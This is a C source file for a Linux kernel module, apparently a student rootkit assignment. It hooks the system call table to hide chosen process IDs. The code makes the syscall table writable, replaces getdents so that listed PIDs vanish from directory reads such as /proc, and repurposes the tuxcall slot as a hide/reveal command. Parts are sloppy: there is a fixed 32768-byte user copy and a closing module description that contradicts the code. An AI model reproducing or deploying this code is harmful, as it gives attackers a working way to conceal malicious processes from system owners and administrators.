/*
 * syscall.c for lkm_syscall
 *
 * Framework by xsyann
 * Framework updated by Yuan Xiao
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Josh & RJ");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define SYSCALL_NI __NR_tuxcall
#define SYSCALL_GD __NR_getdents
#define TAG "stealth"
#define HIDE 0
#define REVEAL 1

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

struct hidden_pid_list {
    char pid_str[16];
    int pid;
    struct hidden_pid_list *next;
};

typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);

static ulong *syscall_table = NULL;
static void *original_syscall = NULL;
static void *original_syscall_getdents = NULL;
static char buffer[32768];
static struct hidden_pid_list list_head;

static int add_to_list(int pid)
{
    struct hidden_pid_list *tail, *new_entry;
    int string_size;

    tail = &list_head;
    while (tail->next != NULL) {
        tail = tail->next;
    }

    new_entry = (struct hidden_pid_list*)kmalloc(sizeof(struct hidden_pid_list),
            GFP_KERNEL);
    if (!new_entry) {
        printk(KERN_ERR "%s: Failed to allocate memory", TAG);
        return -ENOMEM;
    }

    if ((string_size = sprintf(new_entry->pid_str, "%i", pid)) < 0) {
        printk(KERN_ERR "%s: Failed to convert int to string", TAG);
        return string_size;
    }

    new_entry->pid = pid;
    new_entry->next = NULL;
    tail->next = new_entry;

    return 0;
}

static int remove_from_list(int pid)
{
    struct hidden_pid_list *prev, *curr;
    prev = &list_head;
    curr = list_head.next;

    while (curr != NULL && curr->pid != pid) {
        prev = curr;
        curr = curr->next;
    }

    if (curr == NULL) {
        return -ENOENT;
    }

    prev->next = curr->next;
    kfree(curr);
    return 0;
}

static int lkm_syscall_hide(int pid, int flag)
{
    if (flag == HIDE) {
        printk(KERN_INFO "%s: Hiding PID %i\n", TAG, pid);
        return add_to_list(pid);
    } else if (flag == REVEAL) {
        printk(KERN_INFO "%s: Revealing PID %i\n", TAG, pid);
        return remove_from_list(pid);
    }

    return -EINVAL;
}

static int lkm_syscall_getdents(unsigned int fd,
        struct linux_dirent *dirp, unsigned int count)
{
    int ret, offset, node_found;
    struct linux_dirent *loc_dirp, *dir;
    struct hidden_pid_list *pid_node;
    char *offset_buffer;
    void *dest, *src;
    size_t move_amt;

    ret = ((getdents)original_syscall_getdents)(fd, dirp, count);

    if (copy_from_user(buffer, dirp, 32768) != 0) {
        return -EFAULT;
    }

    offset = 0;
    loc_dirp = (struct linux_dirent *)buffer;

    while (offset < ret) {
        offset_buffer = ((char*)loc_dirp) + offset;
        dir = (struct linux_dirent *)offset_buffer;

        pid_node = list_head.next;
        node_found = 0;
        while (pid_node != NULL && !node_found) {
            if (strcmp(pid_node->pid_str, dir->d_name) == 0) {
                printk("%s: Match to hidden pid %s found", TAG,
                        pid_node->pid_str);
                ret -= dir->d_reclen;
                dest = (void *)offset_buffer;
                src = (void *)(offset_buffer + dir->d_reclen);
                move_amt = ret - offset;
                memmove(dest, src, move_amt);
                node_found = 1;
            }

            pid_node = pid_node->next;
        }

        if (!node_found) {
            offset += dir->d_reclen;
        }
    }

    if (copy_to_user(dirp, buffer, ret)) {
        return -EFAULT;
    }

    return ret;
}

static int is_syscall_table(ulong *p)
{
    return ((p != NULL) && (p[__NR_close] == (ulong)sys_close));
}

static int page_read_write(ulong address)
{
    uint level;
    pte_t *pte = lookup_address(address, &level);

    if (pte->pte &~ _PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

static int page_read_only(ulong address)
{
    uint level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~ _PAGE_RW;
    return 0;
}

static void replace_syscall(ulong offset, ulong func_address, void **old_func)
{
    syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);

    if (is_syscall_table(syscall_table)) {
        page_read_write((ulong)syscall_table);
        *old_func = (void *)(syscall_table[offset]);
        syscall_table[offset] = func_address;
        page_read_only((ulong)syscall_table);
    }
}

static int init_syscall(void)
{
    printk(KERN_INFO "%s: Custom syscall loaded\n", TAG);
    list_head.pid_str[0] = 0;
    list_head.pid = -1;
    list_head.next = NULL;
    replace_syscall(SYSCALL_GD, (ulong)lkm_syscall_getdents,
            &original_syscall_getdents);
    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_hide,
            &original_syscall);
    return 0;
}

static void cleanup_syscall(void)
{
    struct hidden_pid_list *node, *temp;

    page_read_write((ulong)syscall_table);
    syscall_table[SYSCALL_NI] = (ulong)original_syscall;
    syscall_table[SYSCALL_GD] = (ulong)original_syscall_getdents;
    page_read_only((ulong)syscall_table);

    node = list_head.next;
    list_head.next = NULL;
    while (node != NULL) {
        temp = node;
        node = node->next;
        kfree(temp);
    }

    printk(KERN_INFO "%s: Custom syscall unloaded\n", TAG);
}

module_init(init_syscall);
module_exit(cleanup_syscall);

MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
